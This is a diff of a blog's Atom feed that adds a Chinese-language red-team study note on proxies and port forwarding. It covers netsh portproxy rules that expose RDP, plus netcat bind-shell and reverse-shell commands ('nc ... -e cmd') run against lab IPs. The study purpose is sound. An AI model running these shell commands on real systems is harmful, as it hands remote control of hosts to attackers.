@@ -6,7 +6,7 @@
   <link href="https://ey404.github.io/atom.xml" rel="self"/>
   
   <link href="https://ey404.github.io/"/>
-  <updated>2021-04-03T07:02:08.667Z</updated>
+  <updated>2021-04-05T06:11:57.272Z</updated>
   <id>https://ey404.github.io/</id>
   
   <author>
@@ -15,6 +15,38 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>【内网渗透学习笔记】04、代理与端口转发</title>
+    <link href="https://ey404.github.io/2021/04/05/intranet04/"/>
+    <id>https://ey404.github.io/2021/04/05/intranet04/</id>
+    <published>2021-04-05T06:09:46.000Z</published>
+    <updated>2021-04-05T06:11:57.272Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h2><p>代理（Proxy）也称为网络代理，是一种特殊的网络服务，允许一个网络终端（客户端）通过这个服务与另一个网络终端（服务器）进行非直接的连接，代理服务有效的保护了网络终端的隐私。</p><h3 id="正向代理"><a href="#正向代理" class="headerlink" title="正向代理"></a>正向代理</h3><p>正向代理即客户端代理，服务器不知道实际发起的客户端。比如<code>vpn</code>,国内不能直接访问谷歌，客户端通过代理服务器可以访问谷歌，客户端将数据转发到代理服务器，再由代理服务器转发给谷歌获取到数据，再返回客户端，这里是代理客户端。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Client --&gt;<span class="built_in"> Proxy </span>&lt;--&gt; Server</span><br></pre></td></tr></table></figure><p>拓扑结构：</p><p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210405104330783.png" alt="image-20210405104330783"></p><h3 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h3><p>反向代理即服务器代理，客户端不知道实际提供服务的服务器。比如Windowds远程连接,客户端想要访问服务器的3389端口，可是服务器的3389端口不对外开放，这里通过端口转发，将所有3389端口转发到3333端口，这样客户端访问3333端口就相当于访问了3389端口。这里是代理服务器。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Client &lt;--&gt;<span class="built_in"> Proxy </span>&lt;-- Server</span><br></pre></td></tr></table></figure><p>拓扑结构：</p><p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210405105139188.png" alt="image-20210405105139188"></p><h2 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h2><ul><li>基础命令</li></ul><p>使用portproxy模式下的netsh命令即能实现Windows系统中的端口转发，转发命令如下：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh interface portproxy add v4tov4 listenaddress=localaddress listenport=localport connectaddress=destaddress connectport=destport</span><br></pre></td></tr></table></figure><ul><li>参数含义</li></ul><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># listenaddress等待连接的本地ip地址</span></span><br><span class="line"><span class="meta"># listenport本地监听的TCP端口(待转发)</span></span><br><span class="line"><span class="meta"># connectaddress被转发端口的本地或者远程主机的ip地址</span></span><br><span class="line"><span class="meta"># connectport被转发的端口</span></span><br></pre></td></tr></table></figure><ul><li>添加转发规则 <a>（需要管理员权限）</a></li></ul><blockquote><p>转发前需要确定listenport中指定的本地端口号不被其它服务使用或监听</p></blockquote><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano | <span class="built_in">find</span> &quot;<span class="number">3333</span>&quot;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210405140242789.png" alt="image-20210405140242789"></p><blockquote><p>或者使用powershell查看</p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Test-NetConnection</span> <span class="literal">-ComputerName</span> localhost <span class="literal">-Port</span> <span class="number">3333</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210405140430761.png" alt="image-20210405140430761"></p><blockquote><p>添加转发规则</p></blockquote><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh interface portproxy <span class="built_in">set</span> v4tov4 listenport=<span class="number">3333</span> listenaddress=<span class="number">10</span>.<span class="number">7</span>.<span class="number">6</span>.<span class="number">85</span> connectaddress=<span class="number">10</span>.<span class="number">7</span>.<span class="number">6</span>.<span class="number">85</span> connectport=<span class="number">3389</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210405134229782.png" alt="image-20210405134229782"></p><ul><li>查看转发规则</li></ul><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh interface portproxy show all</span><br></pre></td></tr></table></figure><ul><li>尝试连接</li></ul><p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210405134329342.png" alt="image-20210405134329342"></p><ul><li>删除规则</li></ul><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh interface portproxy delete v4tov4 listenport=<span class="number">3333</span> listenaddress=<span class="number">10</span>.<span class="number">7</span>.<span class="number">6</span>.<span class="number">85</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210405134600311.png" alt="image-20210405134600311"></p><h2 id="nc反弹"><a href="#nc反弹" class="headerlink" title="nc反弹"></a>nc反弹</h2><h3 id="正向连接"><a href="#正向连接" class="headerlink" title="正向连接"></a>正向连接</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lp <span class="number">7777</span> -e <span class="built_in">cmd</span></span><br></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 10.7.6.85 7777</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210405135720564.png" alt="image-20210405135720564"></p><h3 id="反向连接"><a href="#反向连接" class="headerlink" title="反向连接"></a>反向连接</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 7777</span><br></pre></td></tr></table></figure><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc <span class="number">10.7</span><span class="number">.6</span><span class="number">.177</span> -e cmd</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210405135848989.png" alt="image-20210405135848989"></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;代理&quot;&gt;&lt;a href=&quot;#代理&quot; class=&quot;headerlink&quot; title=&quot;代理&quot;&gt;&lt;/a&gt;代理&lt;/h2&gt;&lt;p&gt;代理（Proxy）也称为网络代理，是一种特殊的网络服务，允许一个网络终端（客户端）通过这个服务与另一个网络终端（服务器）进行非直接的连接，代</summary>
+      
+    
+    
+    
+    <category term="内网学习笔记" scheme="https://ey404.github.io/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
+    
+    
+    <category term="红队" scheme="https://ey404.github.io/tags/%E7%BA%A2%E9%98%9F/"/>
+    
+    <category term="学习笔记" scheme="https://ey404.github.io/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
+    
+    <category term="内网渗透" scheme="https://ey404.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
+    
+    <category term="代理" scheme="https://ey404.github.io/tags/%E4%BB%A3%E7%90%86/"/>
+    
+    <category term="端口转发" scheme="https://ey404.github.io/tags/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/"/>
+    
+  </entry>
   
   <entry>
     <title>【内网渗透学习笔记】03、Windows建立隐藏用户</title>
